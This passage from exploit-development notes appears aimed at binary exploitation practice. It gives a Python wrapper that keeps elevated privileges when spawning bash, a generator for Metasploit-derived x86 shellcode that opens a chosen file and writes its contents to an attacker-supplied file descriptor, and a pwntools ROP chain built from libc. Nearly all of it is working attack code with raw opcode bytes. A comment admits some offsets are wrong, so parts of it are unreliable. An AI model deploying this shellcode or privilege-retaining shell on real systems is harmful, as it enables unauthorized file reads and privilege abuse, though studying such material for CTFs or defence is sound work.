Note that the usually the base pointer is trashed during the exploting
process in a normal exploitation process, but the stack pointer is not.


- http://www.blackhatlibrary.net/Shellcode/Null-free

Since the standard ``/bin/sh`` is a link to ``/bin/bash`` that
droppes privileges when called, you can call instead a script
like the following

```python
#!/usr/bin/env python2
import os
os.setresuid(os.geteuid(), os.geteuid(), os.geteuid())
os.execlp("bash", "bash")
```

The following shellcode open a fixed file and then write its contents
of to a file descriptor passed as first argument into the stack:

## Stack-based

```python
# linux/x86/read_file - 84 bytes
# http://www.metasploit.com
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
#
# Modified shell code that reads a file and write its contents in the file descriptor
# passed as first argument into the stack.
#
# TODO: make configurable the use of sys_sendto() and return to the caller.
import sys

if len(sys.argv) < 2:
    sys.stderr.write('usage: %s <PATH>' % sys.argv[0])
    sys.exit(1)

path = sys.argv[1]

def put_piece_into_stack(piece):
    length = len(piece)
    assert length <= 4

    null_byte_needed = length < 4

    if null_byte_needed:
        piece = 'x'*(4 - length) + piece

    return  null_byte_needed, ('\xb8%s' % piece) + \
            ('\xc1\xe8%c' % ((4 - length)*8) if null_byte_needed else '') + \
            '\x50'

def build_string_into_stack(path_string):
    '''Returns the instructions to put into the stack
    the path needed

    0x00000002   5               b87878786f  mov eax, 0x6f787878
    0x00000007   3                   c1e818  shr eax, 0x18
    0x0000000a   1                       50  push eax
    '''

    path_length = len(path_string)
    # split the path so that each piece fit into a 32 bits register
    path_componentes = [path_string[x:x + 4] for x in range(0, path_length, 4)]
    path_componentes.reverse()

    buf = ''

    for path_component in path_componentes:
        null_byte_needed, opcode = put_piece_into_stack(path_component)
        buf += opcode

    return buf


buf  = ""                             # NOTE: some offset are wrong since we have modified the original shellcode
buf += "\x89\xe5"                     # 0x00000000   2                     89e5  mov ebp, esp

buf += build_string_into_stack(path)

buf += "\x31\xc0"                     # 0x00000017   2                     31c0  xor eax, eax
buf += "\x40"                         # 0x00000019   1                       40  inc eax
buf += "\x40"                         # 0x0000001a   1                       40  inc eax
buf += "\x40"                         # 0x0000001b   1                       40  inc eax
buf += "\x40"                         # 0x0000001c   1                       40  inc eax
buf += "\x40"                         # 0x0000001d   1                       40  inc eax
buf += "\x89\xe3"                     # 0x0000001e   2                     89e3  mov ebx, esp
buf += "\x31\xc9"                     # 0x00000020   2                     31c9  xor ecx, ecx
buf += "\xcd\x80"                     # 0x00000022   2                     cd80  int 0x80             sys_open()
buf += "\x89\xc3"                     # 0x00000024   2                     89c3  mov ebx, eax
buf += "\xb8\x40\x30\x20\x10"         # 0x00000026   5               b840302010  mov eax, 0x10203040
buf += "\xc1\xe8\x10"                 # 0x0000002b   3                   c1e810  shr eax, 0x10
buf += "\x50"                         # 0x0000002e   1                       50  push eax
buf += "\x29\xc4"                     # 0x0000002f   2                     29c4  sub esp, eax
buf += "\x31\xc0"                     # 0x00000031   2                     31c0  xor eax, eax
buf += "\x40"                         # 0x00000033   1                       40  inc eax
buf += "\x40"                         # 0x00000034   1                       40  inc eax
buf += "\x40"                         # 0x00000035   1                       40  inc eax
buf += "\x89\xe7"                     # 0x00000036   2                     89e7  mov edi, esp
buf += "\x89\xf9"                     # 0x00000038   2                     89f9  mov ecx, edi
buf += "\x8b\x55\xf0"                 # 0x0000003a   3                   8b55f0  mov edx, [ebp-0x10]
buf += "\xcd\x80"                     # 0x0000003d   2                     cd80  int 0x80             sys_read()
buf += "\x89\xc2"                     # 0x0000003f   2                     89c2  mov edx, eax
buf += "\x31\xc0"                     # 0x00000041   2                     31c0  xor eax, eax
buf += "\x40"                         # 0x00000043   1                       40  inc eax
buf += "\x40"                         # 0x00000044   1                       40  inc eax
buf += "\x40"                         # 0x00000045   1                       40  inc eax
buf += "\x40"                         # 0x00000046   1                       40  inc eax
buf += "\x8b\x5d\x04"                 # 0x00000047   3                   8b5d04  mov ebx, [ebp+0x4]
buf += "\xcd\x80"                     # 0x0000004a   2                     cd80  int 0x80             sys_write()
buf += "\x31\xc0"                     # 0x0000004c   2                     31c0  xor eax, eax
buf += "\x40"                         # 0x0000004e   1                       40  inc eax
buf += "\x31\xdb"                     # 0x0000004f   2                     31db  xor ebx, ebx
buf += "\xcd\x80"                     # 0x00000051   2                     cd80  int 0x80             sys_exit()

sys.stdout.write(buf)
```

## ROP

```python
import sys

from pwnlib.rop import rop
from pwnlib import constants
from pwnlib.context import context

context.arch = 'amd64'
r = rop.ROP('libc.so.6')
r.write(constants.STDOUT_FILENO, 0x400639, 5)
r.exit()

sys.stderr.write(r.dump())

sys.stdout.write(str(r))
```
